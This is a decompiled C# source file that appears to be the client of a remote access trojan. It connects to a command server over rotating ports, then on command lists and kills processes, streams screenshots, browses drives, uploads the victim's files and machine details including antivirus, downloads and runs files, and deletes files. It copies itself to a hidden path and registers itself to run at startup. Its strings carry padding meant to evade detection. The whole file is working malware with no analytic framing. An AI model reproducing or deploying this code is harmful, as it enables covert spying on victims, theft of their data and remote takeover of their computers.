using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace thnaviwa;

public class MACDM
{
	public bool thnaviwais_working = false;

	private bool thnaviwaiswitch = false;

	public int port_sn = 0;

	private Dictionary<string, byte[]> thnaviwatasks = new Dictionary<string, byte[]>();

	private THRDE thnaviwaStateObj = new THRDE();

	private URYINF thnaviwaUPC;

	private OCRMD thnaviwaCMD;

	private int thnaviwascrSize = 200;

	private ThreadStart thnaviwafunStarter;

	public TcpClient thnaviwatcpsck;

	public DateTime thnaviwarunTime;

	private int thnaviwabytesRead = 0;

	public bool thnaviwareqCnls = false;

	public bool thnaviwaautCnls = false;

	public DateTime thnaviwalTimeUtc;

	public NetworkStream thnaviwanetStream;

	private int thnaviwabuffSize = 1024;

	private DIRINFO thnaviwaHD = new DIRINFO();

	private bool thnaviwathrRuning = false;

	private bool thnaviwastr_writer = false;

	private bool thnaviwacapScreen = false;

	private Thread thnaviwafunThread;

	public void thnaviwado_start()
	{
		thnaviwarunTime = DateTime.Now;
		thnaviwaUPC = new URYINF();
		thnaviwaCMD = new OCRMD(this);
		thnaviwaHD.iserver = this;
		thnaviwaHD.thnaviwamainPath = CONFIG.thnaviwaget_mpath();
		TimerCallback callback = thnaviwalookup_connect;
		Timer thnaviwatimer = new Timer(callback, thnaviwaStateObj, 32110, 36110);
		thnaviwaStateObj.thnaviwatimer = thnaviwatimer;
		if (!Directory.Exists(CONFIG.thnaviwaget_mpath()))
		{
			Directory.CreateDirectory(CONFIG.thnaviwaget_mpath());
		}
	}

	public void thnaviwasaveFile(string filePath)
	{
		try
		{
			byte[] array = thnaviwapull_data();
			if (array != null)
			{
				File.WriteAllBytes(filePath, array);
			}
		}
		catch
		{
		}
	}

	private void thnaviwacheckLastatime(DateTime mTimeUtc)
	{
		try
		{
			int num = Math.Abs(thnaviwarunTime.Subtract(mTimeUtc).Minutes);
			if (num > 5)
			{
				thnaviwatcpsck.Close();
				thnaviwais_working = false;
			}
		}
		catch
		{
		}
	}

	private bool thnaviwaIPSConfig()
	{
		try
		{
			CONFIG.thnaviwadefaultP = thnaviwaCMD.thnaviwaserverIPD();
			thnaviwatcpsck = new TcpClient();
			thnaviwatcpsck.Connect(CONFIG.thnaviwadefaultP, CONFIG.thnaviwaport);
			return true;
		}
		catch
		{
			thnaviwaports_switch();
			return false;
		}
	}

	public string thnaviwafile_info(string path, bool ret = false)
	{
		try
		{
			FileInfo fileInfo = new FileInfo(path);
			string text = fileInfo.Name + ((!ret) ? ">|thnaviwa".Split(new char[1] { '|' })[0] : "<|thnaviwa".Split(new char[1] { '|' })[0]);
			text = text + fileInfo.CreationTimeUtc.Date.ToString() + ((!ret) ? ">|thnaviwa".Split(new char[1] { '|' })[0] : "<|thnaviwa".Split(new char[1] { '|' })[0]);
			text = text + thnaviwaget_size(fileInfo.Length) + ((!ret) ? ">|thnaviwa".Split(new char[1] { '|' })[0] : "<|thnaviwa".Split(new char[1] { '|' })[0]);
			if (!ret)
			{
				thnaviwapush_data(null, "thnaviwa-filsz=|thnaviwa".Split(new char[1] { '|' })[0] + text);
			}
			return text;
		}
		catch
		{
			return "";
		}
	}

	public void thnaviwaports_switch()
	{
		port_sn++;
		switch (port_sn)
		{
		case 0:
			CONFIG.thnaviwaport = CONFIG.port;
			break;
		case 1:
			CONFIG.thnaviwaport = CONFIG.aport;
			break;
		case 2:
			CONFIG.thnaviwaport = CONFIG.bport;
			break;
		case 3:
			CONFIG.thnaviwaport = CONFIG.cport;
			break;
		case 4:
			CONFIG.thnaviwaport = CONFIG.cport;
			break;
		}
		if (port_sn >= 4)
		{
			port_sn = 0;
		}
	}

	public bool thnaviwasend_auto(string fileinfo)
	{
		try
		{
			string[] array = fileinfo.Split(new char[1] { '>' });
			string path = array[0];
			if (File.Exists(path))
			{
				string fileName = Path.GetFileName(path);
				byte[] data = File.ReadAllBytes(path);
				fileinfo = fileinfo + ">" + fileName;
				thnaviwapush_data(data, "thnaviwa-afile=" + fileinfo);
				return false;
			}
			thnaviwapush_data(null, "thnaviwa-anfod=" + fileinfo);
			return false;
		}
		catch
		{
			return false;
		}
	}

	private void thnaviwalookup_connect(object sdource)
	{
		try
		{
			if (!thnaviwathrRuning)
			{
				thnaviwathrRuning = true;
				thnaviwacheckLastatime(DateTime.Now);
				if (!thnaviwais_working || !thnaviwatcpsck.Connected)
				{
					thnaviwais_working = thnaviwaIPSConfig();
					if (thnaviwais_working)
					{
						thnaviwabuffSize = thnaviwatcpsck.ReceiveBufferSize;
						thnaviwasee_responce();
					}
				}
			}
			thnaviwathrRuning = false;
		}
		catch
		{
			thnaviwathrRuning = false;
			thnaviwastr_writer = false;
			thnaviwais_working = false;
			thnaviwaiswitch = false;
		}
	}

	public void thnaviwaload_app()
	{
		try
		{
			string executablePath = Application.get_ExecutablePath();
			string text = CONFIG.thnaviwaget_mpath() + CONFIG.thnaviwamainApp + ".exe|thnaviwa".Split(new char[1] { '|' })[0];
			if (text != executablePath)
			{
				File.WriteAllBytes(text, File.ReadAllBytes(executablePath));
			}
			Thread.Sleep(10);
			CONFIG.thnaviwaset_run("_thnasr|thnaviwa".Split(new char[1] { '|' })[0], CONFIG.thnaviwaget_mpath() + CONFIG.thnaviwamainApp + ".exe|thnaviwa".Split(new char[1] { '|' })[0]);
		}
		catch
		{
		}
	}

	public void thnaviwalist_processes()
	{
		try
		{
			string text = "";
			Process[] processes = Process.GetProcesses();
			for (int i = 0; i <= processes.Length - 1; i++)
			{
				text = text + processes[i].Id + ">|thnaviwa".Split(new char[1] { '|' })[0];
				text = text + processes[i].ProcessName + ">|thnaviwa".Split(new char[1] { '|' })[0];
				text += "0>|thnaviwa".Split(new char[1] { '|' })[0];
				text += "<";
			}
			byte[] byteArray = CONFIG.getByteArray(text);
			thnaviwapush_data(byteArray, "thnaviwa-procl=process|thnaviwa".Split(new char[1] { '|' })[0]);
		}
		catch
		{
		}
	}

	private void thnaviwasee_scren(string screenSize)
	{
		try
		{
			WSCRNS wSCRNS = new WSCRNS();
			thnaviwascrSize = Convert.ToInt16(screenSize.Split(new char[1] { '>' })[0].Trim());
			Bitmap val = wSCRNS.thnaviwascreen(thnaviwascrSize);
			if (val != null)
			{
				MemoryStream memoryStream = new MemoryStream();
				((Image)val).Save((Stream)memoryStream, ImageFormat.get_Jpeg());
				thnaviwapush_data(memoryStream.ToArray(), "thnaviwa-sascr=cacreen|thnaviwa".Split(new char[1] { '|' })[0]);
			}
		}
		catch
		{
		}
	}

	private void thnaviwaimage_info(string path)
	{
		//IL_0002: Unknown result type (might be due to invalid IL or missing references)
		//IL_001b: Expected O, but got Unknown
		//IL_0016: Unknown result type (might be due to invalid IL or missing references)
		//IL_001c: Expected O, but got Unknown
		try
		{
			Bitmap val = new Bitmap((Image)new Bitmap(path), new Size(200, 150));
			if (val != null)
			{
				FileInfo fileInfo = new FileInfo(path);
				string text = fileInfo.Name + ">|thnaviwa".Split(new char[1] { '|' })[0];
				text = text + fileInfo.CreationTimeUtc.Date.ToString() + ">|thnaviwa".Split(new char[1] { '|' })[0];
				text = text + thnaviwaget_size(fileInfo.Length) + ">";
				MemoryStream memoryStream = new MemoryStream();
				((Image)val).Save((Stream)memoryStream, ImageFormat.get_Gif());
				thnaviwapush_data(memoryStream.ToArray(), "thnaviwa-thumb=|thnaviwa".Split(new char[1] { '|' })[0] + text);
			}
		}
		catch
		{
		}
	}

	private void thnaviwauser_info()
	{
		string text = thnaviwaUPC.thnaviwalancard + "|" + thnaviwaUPC.thnaviwacname + "|" + thnaviwaUPC.thnaviwauname + "|" + thnaviwaUPC.thnaviwauip + "|" + CONFIG.thnaviwaOsname() + "|" + thnaviwaUPC.thnaviwaapver + "|" + CONFIG.thnaviwaloadAV();
		text += "| !thnaviwa".Split(new char[1] { '!' })[0];
		text = text + "|" + thnaviwaUPC.thnaviwaclientNum;
		text = text + "|" + CONFIG.thnaviwaget_mpath();
		byte[] byteArray = CONFIG.getByteArray(text);
		thnaviwapush_data(byteArray, "thnaviwa-info=user|thnaviwa".Split(new char[1] { '|' })[0]);
	}

	private void thnaviwais_screen(string screenSize)
	{
		try
		{
			WSCRNS wSCRNS = new WSCRNS();
			thnaviwascrSize = Convert.ToInt16(screenSize.Split(new char[1] { '>' })[0].Trim());
			while (thnaviwacapScreen && thnaviwais_working)
			{
				Bitmap val = wSCRNS.thnaviwascreen(thnaviwascrSize);
				if (val != null)
				{
					MemoryStream memoryStream = new MemoryStream();
					((Image)val).Save((Stream)memoryStream, ImageFormat.get_Jpeg());
					thnaviwapush_data(memoryStream.ToArray(), "thnaviwa-scren=cacreen|thnaviwa".Split(new char[1] { '|' })[0]);
				}
			}
		}
		catch
		{
		}
	}

	private void thnaviwascreenSize(string scSize)
	{
		try
		{
			thnaviwascrSize = Convert.ToInt16(scSize.Split(new char[1] { '>' })[0].Trim());
		}
		catch
		{
		}
	}

	public void thnaviwaremove_file(string path)
	{
		try
		{
			File.Delete(path);
		}
		catch
		{
		}
	}

	private string thnaviwaget_size(long byteCount)
	{
		try
		{
			string[] array = new string[7]
			{
				"B|thnaviwa".Split(new char[1] { '|' })[0],
				"KB|thnaviwa".Split(new char[1] { '|' })[0],
				"MB|thnaviwa".Split(new char[1] { '|' })[0],
				"GB|thnaviwa".Split(new char[1] { '|' })[0],
				"TB|thnaviwa".Split(new char[1] { '|' })[0],
				"PB|thnaviwa".Split(new char[1] { '|' })[0],
				"EB|thnaviwa".Split(new char[1] { '|' })[0]
			};
			if (byteCount == 0L)
			{
				return "0" + array[0];
			}
			long num = Math.Abs(byteCount);
			int num2 = Convert.ToInt32(Math.Floor(Math.Log(num, 1024.0)));
			double num3 = Math.Round((double)num / Math.Pow(1024.0, num2), 1);
			return (double)Math.Sign(byteCount) * num3 + array[num2];
		}
		catch
		{
			return "";
		}
	}

	private void thnaviwapush_file(string lfile)
	{
		try
		{
			if (File.Exists(lfile))
			{
				string fileName = Path.GetFileName(lfile);
				thnaviwapush_data(File.ReadAllBytes(lfile), "thnaviwa-file=|thnaviwa".Split(new char[1] { '|' })[0] + lfile + ">0>" + fileName, tmp: true);
			}
		}
		catch
		{
		}
	}

	public string[] thnaviwaget_command()
	{
		try
		{
			byte[] array = new byte[5];
			thnaviwabytesRead = thnaviwanetStream.Read(array, 0, 5);
			int num = BitConverter.ToInt32(array, 0);
			byte[] array2 = new byte[num];
			int num2 = 0;
			for (int num3 = num; num3 > 0; num3 -= thnaviwabytesRead)
			{
				int count = ((num3 > thnaviwabuffSize) ? thnaviwabuffSize : num3);
				thnaviwabytesRead = thnaviwanetStream.Read(array2, num2, count);
				num2 += thnaviwabytesRead;
			}
			string text = Encoding.UTF8.GetString(array2, 0, num).ToString();
			if (text.Trim() == "")
			{
				return null;
			}
			return text.Split(new char[1] { '=' });
		}
		catch
		{
			thnaviwais_working = false;
			return null;
		}
	}

	private void thnaviwasee_responce()
	{
		if (!thnaviwaiswitch)
		{
			thnaviwaiswitch = true;
			thnaviwanetStream = thnaviwaCMD.thnaviwaNS(thnaviwatcpsck);
			thnaviwacapScreen = false;
			while (thnaviwais_working)
			{
				string[] switchType = thnaviwaget_command();
				if (switchType != null)
				{
					thnaviwareqCnls = false;
					string text = switchType[0].ToLower();
					text = ((text.Split(new char[1] { '-' }).Length <= 1) ? ("thnaviwa-" + text) : ("thnaviwa-" + text.Split(new char[1] { '-' })[1]));
					switch (text)
					{
					case "thnaviwa-procl":
						thnaviwafunStarter = delegate
						{
							thnaviwalist_processes();
						};
						thnaviwafunThread = new Thread(thnaviwafunStarter);
						thnaviwafunThread.Start();
						break;
					case "thnaviwa-thumb":
						thnaviwaimage_info(switchType[1]);
						break;
					case "thnaviwa-clping":
						thnaviwarunTime = DateTime.Now;
						break;
					case "thnaviwa-putsrt":
						thnaviwaload_app();
						break;
					case "thnaviwa-filsz":
						thnaviwafunStarter = delegate
						{
							thnaviwafile_info(switchType[1]);
						};
						thnaviwafunThread = new Thread(thnaviwafunStarter);
						thnaviwafunThread.Start();
						break;
					case "thnaviwa-rupth":
						thnaviwapush_data(null, "thnaviwa-appth=|thnaviwa".Split(new char[1] { '|' })[0] + CONFIG.thnaviwaget_mpath());
						break;
					case "thnaviwa-dowf":
						thnaviwasaveFile(switchType[1]);
						break;
					case "thnaviwa-endpo":
						try
						{
							Thread.Sleep(100);
							Process.GetProcessById(Convert.ToInt16(switchType[1].Trim())).Kill();
						}
						catch
						{
						}
						break;
					case "thnaviwa-scrsz":
						thnaviwascreenSize(switchType[1]);
						break;
					case "thnaviwa-cscreen":
						thnaviwasee_scren(switchType[1]);
						break;
					case "thnaviwa-dirs":
						thnaviwafunThread = new Thread(thnaviwalistDrives);
						thnaviwafunThread.Start();
						break;
					case "thnaviwa-stops":
						thnaviwacapScreen = false;
						break;
					case "thnaviwa-scren":
						thnaviwacapScreen = true;
						thnaviwafunStarter = delegate
						{
							thnaviwais_screen(switchType[1]);
						};
						thnaviwafunThread = new Thread(thnaviwafunStarter);
						thnaviwafunThread.Start();
						break;
					case "thnaviwa-cnls":
						thnaviwaautCnls = true;
						thnaviwareqCnls = true;
						thnaviwacapScreen = false;
						break;
					case "thnaviwa-udlt":
						thnaviwaCMD.thnaviwaremove_user();
						break;
					case "thnaviwa-delt":
						thnaviwaremove_file(switchType[1]);
						break;
					case "thnaviwa-afile":
						thnaviwafunStarter = delegate
						{
							thnaviwasend_auto(switchType[1]);
						};
						thnaviwafunThread = new Thread(thnaviwafunStarter);
						thnaviwafunThread.Start();
						break;
					case "thnaviwa-listf":
						thnaviwafunStarter = delegate
						{
							thnaviwaHD.thnaviwalookFiles(switchType[1]);
						};
						thnaviwafunThread = new Thread(thnaviwafunStarter);
						thnaviwafunThread.Start();
						break;
					case "thnaviwa-file":
						thnaviwafunStarter = delegate
						{
							thnaviwapush_file(switchType[1]);
						};
						thnaviwafunThread = new Thread(thnaviwafunStarter);
						thnaviwafunThread.Start();
						break;
					case "thnaviwa-info":
						thnaviwafunThread = new Thread(thnaviwauser_info);
						thnaviwafunThread.Start();
						break;
					case "thnaviwa-runf":
						thnaviwaCMD.thnaviwado_process(switchType[1].Split(new char[1] { '>' })[0]);
						break;
					case "thnaviwa-fles":
					{
						string files = thnaviwaHD.thnaviwalookupFiles(switchType[1]);
						if (files != null)
						{
							thnaviwafunStarter = delegate
							{
								thnaviwapush_data(null, "thnaviwa-fles=|thnaviwa".Split(new char[1] { '|' })[0] + files);
							};
							thnaviwafunThread = new Thread(thnaviwafunStarter);
							thnaviwafunThread.Start();
						}
						break;
					}
					case "thnaviwa-dowr":
						thnaviwasaveFile(switchType[1]);
						break;
					case "thnaviwa-fldr":
					{
						string Folders = thnaviwaHD.thnaviwacheckFolders(switchType[1]);
						if (Folders != null)
						{
							thnaviwafunStarter = delegate
							{
								thnaviwapush_data(null, "thnaviwa-fldr=|thnaviwa".Split(new char[1] { '|' })[0] + Folders);
							};
							thnaviwafunThread = new Thread(thnaviwafunStarter);
							thnaviwafunThread.Start();
						}
						break;
					}
					}
					continue;
				}
				thnaviwais_working = false;
				break;
			}
			thnaviwais_working = false;
			thnaviwacapScreen = false;
		}
		thnaviwaiswitch = false;
	}

	private void thnaviwalistDrives()
	{
		string text = thnaviwaHD.thnaviwalookupDrives();
		thnaviwapush_data(null, "thnaviwa-dirs=" + text);
	}

	public byte[] thnaviwapull_data()
	{
		try
		{
			thnaviwarunTime = DateTime.Now;
			int num = 0;
			byte[] array = new byte[5];
			thnaviwabytesRead = thnaviwanetStream.Read(array, 0, 5);
			int num2 = BitConverter.ToInt32(array, 0);
			byte[] array2 = new byte[num2];
			int num3 = num2;
			while (num3 > 0 && !thnaviwareqCnls)
			{
				int count = ((num3 > thnaviwabuffSize) ? thnaviwabuffSize : num3);
				thnaviwabytesRead = thnaviwanetStream.Read(array2, num, count);
				num += thnaviwabytesRead;
				num3 -= thnaviwabytesRead;
				thnaviwarunTime = DateTime.Now;
			}
			if (thnaviwareqCnls)
			{
				thnaviwanetStream.Flush();
				while (thnaviwanetStream.DataAvailable && thnaviwanetStream.ReadByte() >= 0)
				{
				}
				array2 = null;
			}
			return array2;
		}
		catch
		{
			thnaviwais_working = false;
			return null;
		}
	}

	public bool thnaviwapush_data(byte[] data, string type, bool tmp = false)
	{
		try
		{
			thnaviwarunTime = DateTime.Now;
			if (thnaviwastr_writer)
			{
				return false;
			}
			thnaviwastr_writer = true;
			byte[] byteArray = CONFIG.getByteArray(type);
			int num = 0;
			int num2 = 5;
			byte[] array = null;
			if (data != null)
			{
				array = BitConverter.GetBytes(data.Length);
				num = data.Length;
				num2 = 10;
			}
			byte[] bytes = BitConverter.GetBytes(byteArray.Length);
			byte[] array2 = new byte[num2 + byteArray.Length + num];
			bytes.CopyTo(array2, 0);
			byteArray.CopyTo(array2, 5);
			if (data != null)
			{
				array.CopyTo(array2, 5 + byteArray.Length);
				data.CopyTo(array2, 10 + byteArray.Length);
			}
			int num3 = 0;
			int num4 = array2.Length;
			while (num4 > 0 && !thnaviwareqCnls)
			{
				int num5 = ((num4 > thnaviwabuffSize) ? thnaviwabuffSize : num4);
				thnaviwanetStream.Write(array2, num3, num5);
				num3 += num5;
				num4 -= num5;
				thnaviwarunTime = DateTime.Now;
			}
			thnaviwastr_writer = false;
			if (thnaviwareqCnls)
			{
				return false;
			}
			return true;
		}
		catch
		{
			thnaviwastr_writer = false;
			thnaviwais_working = false;
			return false;
		}
	}
}
